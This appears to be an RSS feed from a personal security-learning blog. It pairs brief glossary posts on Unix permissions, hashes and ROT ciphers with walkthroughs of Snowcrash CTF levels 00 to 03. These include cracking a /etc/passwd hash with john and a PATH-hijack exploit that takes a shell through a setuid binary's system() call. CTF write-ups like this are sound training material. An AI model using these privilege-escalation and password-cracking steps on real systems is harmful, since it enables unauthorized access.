channel.title: Posts on My blog
channel.description: Recent content in Posts on My blog

item.title: What is Environment Table
item.description: An Environment Table is a table that is accessible by each process Some Environment variable to know about name description PATH used to list each directory to search for binary HOME a directory to be consider as the home directory of the current user PWD the current working directory Source wikipedia
item.content:
An Environment Table is a table that is accessible by each process

Some Environment variable to know about

name description
PATH used to list each directory to search for binary
HOME a directory to be consider as the home directory of the current user
PWD the current working directory

Source

  • wikipedia

item.title: What is File Permission
item.description: Each file as his own permission set. It allow to control the ability of the users to view, change, navigate, and execute the contents of the file system Notation for Unix system permission can be see in its symbolic notation using ls -l $ ls -l total 16 -rw-rw-r-- 1 level03 level03 0 Aug 2 17:22 foo with ls -l the 1st column is used to represent the file type and his permission.
item.content:
Each file as his own permission set.
It allow to

control the ability of the users to view, change, navigate, and execute the contents of the file system

Notation for Unix system

permission can be see in its symbolic notation using ls -l

$ ls -l
total 16
-rw-rw-r-- 1 level03 level03    0 Aug  2 17:22 foo

with ls -l the 1st column is used to represent the file type and his permission.

[-][rw-rw-r--]
 ^  ^
 │  │
 │  └─ file permission
 └─ file type

the file permission group is composed of 3 triad each one represented one group:
User / Group / Other

[rw-][rw-][r--]
 ^    ^    ^
 │    │    └─ Other
 │    └─ Group
 └─ User
Letter Location Description
r 1st letter of each triad allow the triad’s group to READ the file
w 2nd letter of each triad allow the triad’s group to MODIFY the file
x 3rd letter of each triad allow the triad’s group to EXECUTE the file
s 3rd letter of User triad allow the user to run the file with the system permissions of the OWNER
s 3rd letter of Group triad allow the user to run the file with the system permissions of the GROUP
t 3rd letter of Other triad only the owner or root can RENAME or DELETE the file
S 3rd letter of User / GROUP triad like s, but the executable bit is disabled
T 3rd letter of Other triad like t, but the executable bit is disabled
- any the corresponding permission is disabled

with our previous example foo give the following permission:

  • for the owner of the file to READ and WRITE
  • for the group to READ and WRITE
  • and for the rest to access the file has READONLY

Source

  • file permission - wiki
  • Setuid & Setgid - wiki
  • Sticky bit - wiki

item.title: Snowcrash - Level03
item.description: On the Home directory of level03 we have an executable file with the setuid file permission set $ ls -l total 12 -rwsr-sr-x 1 flag03 level03 8627 Mar 5 2016 level03 Analyzing level03 By using the debugger gdb, we can disassemble level03 and inspect his ASM code. $ gdb level03 -q Reading symbols from level03...done. Dump of assembler code for function main: (gdb) disas main ... 0x080484f7 <+83>: mov DWORD PTR [esp],0x80485e0 0x080484fe <+90>: call 0x80483b0 <system@plt> 0x08048503 <+95>: leave 0x08048504 <+96>: ret End of assembler dump.
item.content:
On the Home directory of level03 we have an executable file with the setuid file permission set

$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03

Analyzing level03

By using the debugger gdb, we can disassemble level03 and inspect his ASM code.

$ gdb level03 -q
Reading symbols from level03...done.
Dump of assembler code for function main:
(gdb) disas main
   ...
   0x080484f7 <+83>:	mov    DWORD PTR [esp],0x80485e0
   0x080484fe <+90>:	call   0x80483b0 <system@plt>
   0x08048503 <+95>:	leave
   0x08048504 <+96>:	ret
End of assembler dump.
(gdb) x/s 0x80485e0
0x80485e0:	"/usr/bin/env echo Exploit me"

We jump to what we are interesting in, the system call.
Put it together, we get the following line in C.

system("/usr/bin/env echo Exploit me");

Exploiting the executable

As you can see, we can exploit the system call and making it execute arbitrary code by modifying the PATH env variable.

With the following example, I manage the execute a shell with the right of flag03.

$ mkdir /tmp/03
$ cd /tmp/03
$ echo "/bin/sh" > echo
$ cd
$ PATH=/tmp/03:$PATH ./level03 # We add our dir in first of PATH, so our echo who is executed
$ whoami
flag03

item.title: Snowcrash - Level02
item.description: $ file level02.pcap level02.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 16777216) level02.pcap is a file that contains tcp packets. I will use Wireshark to read the file just by looking at the tcp stream, we see that the user as enter a password ( but beware of special chars ) we can use that password to connect as flag02 What is Wireshark Wireshark is a packet analyzer tool used for network analysis
item.content:
$ file level02.pcap
level02.pcap: tcpdump capture file (little-endian) - version 2.4 (Ethernet, capture length 16777216)

level02.pcap is a file that contains tcp packets. I will use Wireshark to read the file

just by looking at the tcp stream, we see that the user as enter a password ( but beware of special chars )

we can use that password to connect as flag02

What is Wireshark

Wireshark is a packet analyzer tool used for network analysis

item.title: What is Rainbow table
item.description: A Rainbow table is a table of precomputed-hash values generated from hash function. It is generaly used to crack password. Source wikipedia
item.content:
A Rainbow table is a table of precomputed-hash values generated from hash function. It is generaly used to crack password.

Source

  • wikipedia

item.title: What is Brute Force Attack
item.description: In cryptography, a brute force attack is when an attacker submit as many as possible passwords with the hope to guess the right password Source wikipedia
item.content:
In cryptography, a brute force attack is when an attacker submit as many as possible passwords with the hope to guess the right password

Source

  • wikipedia

item.title: What is Hash Function
item.description: an hash function is a function that can take data of arbitrary size and output data to fixed size. the output of an hash function is called: hash value hashes digest For example a hash function can be used to map name to index in a fixed-size table ( hash table ) we call this process hashing Source wikipedia
item.content:
an hash function is a function that can take data of arbitrary size and output data to fixed size. the output of an hash function is called:

  • hash value
  • hashes
  • digest

For example a hash function can be used to map name to index in a fixed-size table ( hash table ) we call this process hashing

Source

  • wikipedia

item.title: Snowcrash - Level01
item.description: when looking the file /etc/passwd, we see that the user flag01 has is hash password written in the deprecated password column $ grep flag01 /etc/passwd flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash It exist some tools to decrypt hash that used different attack method like brute force or wordlist. I will use john for this level. we extract the line that contain the hash to password.txt $ ssh -p 4242 level01@snowcrash grep flag01 /etc/passwd > password.txt [ .
item.content:
when looking the file /etc/passwd, we see that the user flag01 has is hash password written in the deprecated password column

$ grep flag01 /etc/passwd
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash

It exist some tools to decrypt hash that used different attack method like brute force or wordlist. I will use john for this level.

we extract the line that contain the hash to password.txt

$ ssh -p 4242 level01@snowcrash grep flag01 /etc/passwd > password.txt
[ ... output omitted ... ]

then we execute john to decrypt the password

$ /usr/sbin/john password.txt
Using default input encoding: UTF-8
[ ... output omitted ... ]
1g 0:00:00:00 DONE 2/3 (2020-08-02 14:13) 10.00g/s 89740p/s 89740c/s 89740C/s 123456..nutmegs
Use the "--show" option to display all of the cracked passwords reliably

and that its, we get the password to connect to flag01 and get the flag

More about how linux save password of users

the older version of linux was storing the password in the file /etc/passwd. now linux store user account and password separately in /etc/passwd and /etc/shadow respectively

item.title: What is Rot Permutation
item.description: a Rot Permutation or Cesar Permutation is a method to transform a phrase into another by permuting char with another n-th letter generally we add the amount of rotation to the function name: rotXX | rot-XX where XX is the rotation count Example 1 5 10 13 26 … a b f k n a … b c g l o b … c d h m p c … … … … … … … … with rot13 hello world become uryyb jbeyq
item.content:
a Rot Permutation or Cesar Permutation is a method to transform a phrase into another by permuting char with another n-th letter

generally we add the amount of rotation to the function name:

rotXX | rot-XX where XX is the rotation count

Example

1 5 10 13 26 …
a b f k n a …
b c g l o b …
c d h m p c …
… … … … … … …

with rot13 hello world become uryyb jbeyq

item.title: What is Ctf
item.description: CTF stand for Capture The Flag(s). It’s a type of game/exercise were you, the player need to find the flag. The flag is generally a string, but it can represented in other way.
item.content:
CTF stand for Capture The Flag(s).

It’s a type of game/exercise were you, the player need to find the flag.

The flag is generally a string, but it can represented in other way.

item.title: What is Vm
item.description: VM stand for Virtual Machine, it’s a “machine” that will be run inside another machine. Crazy right ? To use a virtual Machine we some software like VirtualBox or VMWare
item.content:
VM stand for Virtual Machine, it’s a “machine” that will be run inside another machine. Crazy right ?

To use a virtual Machine we some software like VirtualBox or VMWare

item.title: Snowcrash - Level00
item.description: on connection to level00, we arrive on a empty home directory An interesting file because we don’t have any file present in the home directory, we search for file related to the user flag00, our target. first we search for with flag00 as owner $ find / -user flag00 2>/dev/null /usr/sbin/john /rofs/usr/sbin/john Cesar, my old friend The file /usr/sbin/john contain a odd string but its not our password. $ cat /usr/sbin/john cdiiddwpgswtgt The filename john refer to a tool to find weak passwords of your users.
item.content:
on connection to level00, we arrive on a empty home directory

An interesting file

because we don’t have any file present in the home directory, we search for file related to the user flag00, our target.

first we search for with flag00 as owner

$ find / -user flag00 2>/dev/null
/usr/sbin/john
/rofs/usr/sbin/john

Cesar, my old friend

The file /usr/sbin/john contain a odd string but its not our password.

$ cat /usr/sbin/john
cdiiddwpgswtgt

The filename john refer to a tool to find weak passwords of your users.

So the string we found must be decoded first, I go to dcode root-n to decode the string using the root permutation method.

With an automatic decode we found an interesting string.

We connect to flag00 using su flag00 with the decoded string, and voila we can get the flag

Source

  • dcode.fr

item.title: Snowcrash
item.description: Introduction Snowcrash is a VM in the style of a CTF. You have 14 level to complete and get each flags Summary Level00: you lost something ? Level01: john, can you give me the flag ? Level02: I want a soda with my shark. Level03 Level04 Level05 Level06 Level07 Level08 Level09 Level10 Level11 Level12 Level13 Level14
item.content:
Introduction

Snowcrash is a VM in the style of a CTF.

You have 14 level to complete and get each flags

Summary

  • Level00: you lost something ?
  • Level01: john, can you give me the flag ?
  • Level02: I want a soda with my shark.
  • Level03
  • Level04
  • Level05
  • Level06
  • Level07
  • Level08
  • Level09
  • Level10
  • Level11
  • Level12
  • Level13
  • Level14
